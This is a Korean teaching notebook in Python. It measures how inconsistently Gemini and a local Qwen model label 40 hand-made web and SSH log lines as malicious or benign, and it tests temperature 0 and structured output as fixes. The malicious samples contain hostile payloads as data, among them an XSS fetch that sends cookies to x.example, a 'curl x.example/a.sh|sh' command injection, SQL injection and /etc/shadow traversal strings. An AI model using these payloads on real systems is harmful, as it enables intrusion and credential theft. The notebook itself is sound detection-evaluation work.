# %% [markdown]
# # S1. 비일관성 — 보안 로그 판정이 매번 달라진다
# - 4강 p.9의 "보안 로그 #1024" 시나리오를 구현한다. 같은 로그를 여러 번 물으면 정상/악성이 바뀌는가?
# - 4강 분류: **Reliability** 문제(분산). 시나리오 1 = 같은 입력·다른 출력, 시나리오 2 = 약간 다른 입력·다른 출력
# - 완화: 온도 0, 구조화 출력(근거 후 판정), self-consistency 다수결

# %%
import sys, os, json, random
sys.path.insert(0, os.path.abspath("../src"))
os.environ.setdefault("GEMINI_MODEL", "gemini-3.5-flash-lite")   # 이 시나리오의 대상 모델 (무료 티어 한도 분산을 위해 시나리오별로 고정)
import numpy as np, pandas as pd
from common import *
plt = setup_plot()
LABELS = ["MALICIOUS", "BENIGN"]
NREP = 3   # 반복 횟수 (무료 API 한도: 모델당 분당 15회)
NVOTE = 3  # self-consistency 표 수
print("대상 모델:", GEMINI_MODEL)

# %% [markdown]
# ## 1. 데이터 — SecLog-40 (자체 구축)
# 악성 20 + 정상 20. 쉬운 사례와 어려운 사례(난독화된 공격 / 공격처럼 보이는 정상)를 섞었다. 후보 60개 중 어려운 사례를 우선 뽑았다.
# IP는 문서용 대역(RFC 5737)만 쓴다. 실제 동작하는 익스플로잇은 없고, 교육용 최소 패턴만 쓴다.

# %%
def acc(ip, req, st=200, ua="Mozilla/5.0"):
    return f'{ip} - - [12/Nov/2026:10:21:07 +0900] "{req}" {st} 512 "-" "{ua}"'

mal = [  # (로그, 유형, 난이도)
    (acc("203.0.113.7", "GET /products?id=1' OR '1'='1 HTTP/1.1"), "sqli", "easy"),
    (acc("203.0.113.8", "GET /products?id=1 UNION SELECT username,password FROM users-- HTTP/1.1", 500), "sqli", "easy"),
    (acc("203.0.113.9", "POST /login HTTP/1.1 body: user=admin'--&pw=x", 200), "sqli", "easy"),
    (acc("203.0.113.10", "GET /item?id=1;DROP TABLE orders;-- HTTP/1.1", 500), "sqli", "easy"),
    (acc("203.0.113.11", "GET /item?id=1%27%20oR%20%271%27%3D%271 HTTP/1.1"), "sqli", "hard"),
    (acc("203.0.113.12", "GET /item?id=1%2527%2520UnIoN%2520SeLeCt%2520NULL,NULL-- HTTP/1.1", 500), "sqli", "hard"),
    (acc("203.0.113.13", "GET /search?q=1' AND SLEEP(5)-- HTTP/1.1", 200), "sqli", "easy"),
    (acc("203.0.113.14", "GET /item?id=1 AND (SELECT COUNT(*) FROM information_schema.tables)>0 HTTP/1.1"), "sqli", "hard"),
    (acc("198.51.100.3", "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1"), "xss", "easy"),
    (acc("198.51.100.4", "GET /profile?name=<img src=x onerror=fetch('//x.example/?c='+document.cookie)> HTTP/1.1"), "xss", "easy"),
    (acc("198.51.100.5", "GET /search?q=%3Csvg%2Fonload%3Dalert(1)%3E HTTP/1.1"), "xss", "hard"),
    (acc("198.51.100.6", "GET /go?url=javascript:alert(1) HTTP/1.1", 302), "xss", "hard"),
    (acc("192.0.2.21", "GET /download?file=../../../../etc/passwd HTTP/1.1", 200), "traversal", "easy"),
    (acc("192.0.2.22", "GET /download?file=..%2f..%2f..%2fetc%2fshadow HTTP/1.1", 403), "traversal", "easy"),
    (acc("192.0.2.23", "GET /static/..%252f..%252fwindows/win.ini HTTP/1.1", 400), "traversal", "hard"),
    (acc("192.0.2.24", "GET /view?page=....//....//etc/hosts HTTP/1.1"), "traversal", "hard"),
    (acc("192.0.2.31", "GET /ping?host=8.8.8.8;cat /etc/passwd HTTP/1.1", 200), "cmdi", "easy"),
    (acc("192.0.2.32", "GET /ping?host=127.0.0.1|whoami HTTP/1.1", 200), "cmdi", "easy"),
    (acc("192.0.2.33", "GET /ping?host=$(curl http://x.example/a.sh|sh) HTTP/1.1", 200), "cmdi", "easy"),
    (acc("192.0.2.34", "GET /ping?host=127.0.0.1%0Aid HTTP/1.1", 200), "cmdi", "hard"),
    ("Nov 12 10:22:01 web01 sshd[2211]: 143 failed password attempts for root from 203.0.113.50 within 60s", "brute", "easy"),
    ("Nov 12 10:22:41 web01 sshd[2231]: Failed password for invalid user admin from 203.0.113.51 port 50122 ssh2 (attempt 87 in 2 min)", "brute", "easy"),
    ("Nov 12 10:23:09 vpn01 auth: login failed for 41 distinct accounts from 198.51.100.77 within 90s", "brute", "easy"),
    ("Nov 12 10:23:55 web01 app: password spraying suspected: 'Summer2026!' tried against 212 accounts from 198.51.100.78", "brute", "hard"),
    ("Nov 12 10:24:30 web01 app: 17 failed logins for 'alice' over 6 hours from 17 different countries", "brute", "hard"),
    (acc("203.0.113.90", "GET /products HTTP/1.1", 200, "sqlmap/1.7.2#stable (https://sqlmap.org)"), "scanner", "easy"),
    (acc("203.0.113.91", "GET /.git/config HTTP/1.1", 404, "Mozilla/5.0 zgrab/0.x"), "scanner", "easy"),
    (acc("203.0.113.92", "GET /wp-admin/setup-config.php HTTP/1.1", 404, "Nikto/2.5.0"), "scanner", "easy"),
    (acc("203.0.113.93", "GET /phpmyadmin/index.php HTTP/1.1", 404, "python-requests/2.31"), "scanner", "hard"),
    (acc("203.0.113.94", "GET /actuator/env HTTP/1.1", 404, "curl/8.4.0"), "scanner", "hard"),
]
ben = [
    (acc("10.0.1.15", "GET /index.html HTTP/1.1"), "normal", "easy"),
    (acc("10.0.1.16", "GET /static/app.css HTTP/1.1", 304), "normal", "easy"),
    (acc("10.0.1.17", "GET /api/v1/orders?page=2&size=20 HTTP/1.1"), "normal", "easy"),
    (acc("10.0.1.18", "POST /api/v1/orders HTTP/1.1 body: {\"item\":\"A-102\",\"qty\":3}", 201), "normal", "easy"),
    (acc("10.0.1.19", "GET /healthz HTTP/1.1", 200, "kube-probe/1.28"), "normal", "easy"),
    (acc("10.0.1.20", "GET /robots.txt HTTP/1.1", 200, "Googlebot/2.1"), "normal", "easy"),
    (acc("10.0.1.21", "GET /favicon.ico HTTP/1.1", 404), "normal", "easy"),
    (acc("10.0.1.22", "GET /download?file=report_2026_Q3.pdf HTTP/1.1"), "normal", "easy"),
    (acc("10.0.1.23", "GET /search?q=%ED%95%9C%EC%84%B1%EB%8C%80%ED%95%99%EA%B5%90 HTTP/1.1"), "normal", "hard"),
    (acc("10.0.1.24", "GET /search?q=O'Reilly+books HTTP/1.1"), "normal", "hard"),
    (acc("10.0.1.25", "GET /search?q=how+to+drop+shipping+business HTTP/1.1"), "normal", "hard"),
    (acc("10.0.1.26", "GET /search?q=union+station+schedule HTTP/1.1"), "normal", "hard"),
    (acc("10.0.1.27", "GET /search?q=select+committee+report HTTP/1.1"), "normal", "hard"),
    (acc("10.0.1.28", "GET /blog/script-writing-tips HTTP/1.1"), "normal", "hard"),
    (acc("10.0.1.29", "POST /api/comments HTTP/1.1 body: {\"text\":\"1 < 2 and 3 > 2, 맞죠?\"}", 201), "normal", "hard"),
    ("Nov 12 10:30:02 web01 sshd[2301]: Accepted publickey for deploy from 10.0.0.5 port 50122 ssh2", "auth", "easy"),
    ("Nov 12 10:30:44 web01 sshd[2305]: Failed password for alice from 10.0.0.7 port 50301 ssh2 (attempt 1)", "auth", "hard"),
    ("Nov 12 10:31:10 vpn01 auth: user bob logged in from 10.0.0.9 using MFA (push)", "auth", "easy"),
    ("Nov 12 10:31:55 web01 app: admin 'kim.ops' logged in from office IP 10.0.0.2", "auth", "easy"),
    ("Nov 12 10:32:30 web01 app: password reset email sent to user 8841", "auth", "easy"),
    ("Nov 12 10:33:05 web01 app: 3 failed logins for 'carol' within 10 min, then success from same IP 10.0.0.12", "auth", "hard"),
    ("Nov 12 10:34:00 db01 postgres[881]: LOG: checkpoint complete: wrote 412 buffers", "system", "easy"),
    ("Nov 12 10:34:20 db01 postgres[881]: LOG: duration: 4.2 ms statement: SELECT id,name FROM products WHERE id = $1", "system", "hard"),
    ("Nov 12 10:35:11 web01 cron[301]: (root) CMD (/usr/local/bin/backup.sh)", "system", "easy"),
    ("Nov 12 10:35:40 web01 kernel: eth0: link up 1000 Mbps full duplex", "system", "easy"),
    ("Nov 12 10:36:02 fw01 ufw: [UFW ALLOW] IN=eth0 SRC=10.0.0.30 DST=10.0.1.5 PROTO=TCP DPT=443", "system", "easy"),
    ("Nov 12 10:36:44 web01 app: scheduled vulnerability scan by Nessus from 10.0.5.9 started (change ticket CHG-2231)", "system", "hard"),
    (acc("10.0.1.40", "GET /admin/users HTTP/1.1", 200, "Mozilla/5.0 (admin console, SSO)"), "normal", "hard"),
    (acc("10.0.1.41", "GET /api/v1/export?format=csv&from=2026-10-01 HTTP/1.1"), "normal", "easy"),
    (acc("10.0.1.42", "GET /static/../static/app.js HTTP/1.1", 200), "normal", "hard"),
]
def pick(rows, label, n, seed=SEED):
    """어려운 사례를 먼저 담고 남는 자리는 쉬운 사례로 채운다 (무료 API 한도 때문에 클래스당 20개로 제한)."""
    hard = [r for r in rows if r[2] == "hard"]; easy = [r for r in rows if r[2] == "easy"]
    random.Random(seed).shuffle(easy)
    return [dict(log=l, label=label, kind=k, level=lv) for l, k, lv in (hard + easy)[:n]]
logs = pick(mal, "MALICIOUS", 20) + pick(ben, "BENIGN", 20)
for i, r in enumerate(logs): r["id"] = i
df = pd.DataFrame(logs)
N = len(logs)
assert N == 40 and (df.label == "MALICIOUS").sum() == 20
json.dump(logs, open(DATA / "seclog40.json", "w", encoding="utf-8"), ensure_ascii=False, indent=1)
df.groupby(["label", "level"]).size().unstack()

# %% [markdown]
# ## 2. 현상 재현 — 같은 입력을 5번 물어본다 (T=1.0)
# 프롬프트 P0 하나로 40개 로그를 3회씩 판정한다. 호출마다 `tag`를 달리해 캐시를 피한다.

# %%
P = [  # 의미는 같고 표현만 다른 프롬프트 4개 (4강 p.11 "요약해 줘 / 요약해줘")
    "다음 보안 로그를 분류해줘. 악성이면 MALICIOUS, 정상이면 BENIGN 중 하나만 답해.\n로그: {log}",
    "아래 로그가 공격인지 아닌지 판정하세요. MALICIOUS 또는 BENIGN 한 단어로 답하세요.\n\n{log}",
    "[로그]\n{log}\n[질문] 이 로그는 악성(MALICIOUS)인가요 정상(BENIGN)인가요? 라벨만 출력.",
    "다음  보안  로그를 분류해줘 .악성이면 MALICIOUS,정상이면 BENIGN 중 하나만 답해.\n로그 : {log} ",
]
SYS = "너는 SOC 분석가다. 로그 한 줄을 보고 판정한다."

def run(method, rep, tpl=P[0], T=1.0):
    """로그 N개 → 판정 리스트. method별 파이프라인."""
    jobs = []
    for r in logs:
        pr = tpl.format(log=r["log"])
        if method == "plain":
            jobs.append(dict(prompt=pr, system=SYS, temperature=T, tag=f"s1-{method}-{rep}"))
        elif method == "struct":   # 근거 한 줄 → 판정 (JSON)
            pr += '\n\nJSON으로만 답해: {"evidence":"근거 한 줄","verdict":"MALICIOUS|BENIGN"}'
            jobs.append(dict(prompt=pr, system=SYS, temperature=T, tag=f"s1-{method}-{rep}", max_tokens=200))
    outs = gemini_many(jobs, workers=8)
    if method == "struct":
        return [first_label(o.split('"verdict"')[-1], LABELS, "BENIGN") for o in outs]
    return [first_label(o, LABELS, "BENIGN") for o in outs]

def stability(runs):
    """runs: NREP개의 판정 리스트 → flip률, Fleiss κ, 평균 정확도."""
    A = np.array(runs)                                   # (실행 횟수, N)
    y = df.label.to_numpy(object)                        # (pandas 3의 Arrow 문자열 배열은 NumPy 비교와 충돌한다)
    M = np.stack([(A == l).sum(0) for l in LABELS], 1)   # (N, 2)
    flip = (M.max(1) < A.shape[0])                       # 한 번이라도 다르면 flip
    accs = (A == y).mean(1)
    return dict(flip=flip.mean(), kappa=fleiss_kappa(M), acc=accs.mean(), acc_sd=accs.std(), _flip_vec=flip)

R = {}
base_runs = [run("plain", i) for i in range(NREP)]
R["baseline (T=1)"] = stability(base_runs)
{k: round(v, 3) for k, v in R["baseline (T=1)"].items() if k[0] != "_"}

# %% [markdown]
# ## 3. 시나리오 2 — 표현만 다른 프롬프트 4개 (T=0)
# 온도를 0으로 고정해도 입력 표면이 바뀌면 판정이 달라지는지 본다.

# %%
runs_p = [run("plain", 0, tpl=t, T=0.0) for t in P]
A = np.array(runs_p)
diff_p = (A != A[0]).any(0)
print(f"프롬프트 4종 간 판정이 달라진 로그: {diff_p.sum()}/{N} = {diff_p.mean():.3f}")
print("프롬프트별 정확도:", np.round((A == df.label.to_numpy(object)).mean(1), 3))

# %% [markdown]
# ## 3-b. 로컬 Qwen2.5-1.5B — 같은 실험을 작은 모델로
# 판정 토큰(MALICIOUS / BENIGN)의 로짓 두 개만 비교한다. API 한도 없이 많이 반복할 수 있다.
# - 표현만 다른 프롬프트 4종(T=0) → 판정이 갈리는 로그 비율
# - 같은 프롬프트를 온도 T로 20번 뽑았을 때 판정이 한 번이라도 갈리는 로그 비율

# %%
def qwen_logits(tpl, log):
    chat = [{"role": "system", "content": SYS}, {"role": "user", "content": tpl.format(log=log)}]
    return local_choice_logits(chat, LABELS)
QZ = np.array([[qwen_logits(t, r["log"]) for r in logs] for t in P])            # (프롬프트 4, N, 2)
qp = np.where(QZ[..., 0] > QZ[..., 1], "MALICIOUS", "BENIGN")
q_diff = (qp != qp[0]).any(0)
y_arr = df.label.to_numpy(object)
print(f"Qwen: 프롬프트 4종 간 판정이 달라진 로그 {q_diff.sum()}/{N} = {q_diff.mean():.3f} | 프롬프트별 정확도 {np.round((qp == y_arr).mean(1), 3)}")
rq = np.random.RandomState(SEED)
rows_q = []
for T in [0.0, 0.25, 0.5, 1.0, 2.0]:
    flips = []
    for i in range(N):
        z = QZ[0, i]
        if T == 0: draws = np.array([z.argmax()] * 20)
        else: draws = rq.choice(2, size=20, p=softmax_T(z, T))
        flips.append(len(set(draws)) > 1)
    rows_q.append({"T": T, "20회 뽑기에서 판정이 갈린 로그 비율": np.mean(flips)})
qtab = pd.DataFrame(rows_q).set_index("T").round(3); qtab.to_csv(RES / "s1_qwen_temperature.csv"); qtab

# %% [markdown]
# ## 4. 완화 기법
# 1. **T=0 고정** (4강 p.10) 2. **구조화 출력** (근거 → 판정) 3. ~~self-consistency~~: (무료 API 하루 한도 때문에 제외)

# %%
R["T=0"] = stability([run("plain", i, T=0.0) for i in range(2)])           # 무료 API 한도 때문에 반복 2회
R["T=0 + 구조화"] = stability([run("struct", i, T=0.0) for i in range(2)])

def majority(votes):   # votes: (표 수, N) → 다수결 판정
    votes = np.array(votes)
    return ["MALICIOUS" if (votes[:, c] == "MALICIOUS").sum() > len(votes) / 2 else "BENIGN" for c in range(N)]
# (self-consistency 다수결은 무료 API 하루 한도 때문에 이번 실험에서 제외했다. majority 함수는 참고용)

res = pd.DataFrame({k: {m: v for m, v in d.items() if m[0] != "_"} for k, d in R.items()}).T.round(3)
res.to_csv(RES / "s1_summary.csv")
res

# %% [markdown]
# ## 5. 비교·해석

# %%
fig, ax = plt.subplots(1, 3, figsize=(13, 3.8))
res["flip"].plot.bar(ax=ax[0], color="#C44E52", rot=20); ax[0].set_title("판정이 뒤집힌 로그 비율 (낮을수록 좋음)")
res["kappa"].plot.bar(ax=ax[1], color="#4C72B0", rot=20); ax[1].set_title("Fleiss κ (높을수록 일관)")
res["acc"].plot.bar(ax=ax[2], color="#55A868", rot=20); ax[2].set_title("정확도"); ax[2].set_ylim(0.5, 1)
for a in ax: a.grid(axis="y", alpha=0.3)
plt.tight_layout(); plt.savefig(FIG / "s1.png"); plt.show()

# 일관성 ≠ 정확성: 가장 일관된 설정도 틀린 로그를 일관되게 틀린다
wrong = [(r["log"][:70], r["label"]) for r, y in zip(logs, np.array(runs_p)[0]) if y != r["label"]]
print("T=0 P0에서 틀린 로그:", len(wrong)); [print(" -", w) for w in wrong[:6]]

# %%
# 항목별 결과 저장 (verify.py가 읽는다)
json.dump({"flip": {k: v["_flip_vec"].astype(int).tolist() for k, v in R.items()}, "diff_prompts": diff_p.astype(int).tolist(),
           "label": df.label.tolist(), "kind": df.kind.tolist(), "level": df.level.tolist(),
           "pred_T0_P0": runs_p[0], "pred_prompts": [list(r) for r in runs_p]},
          open(RES / "items_s1.json", "w"), ensure_ascii=False)
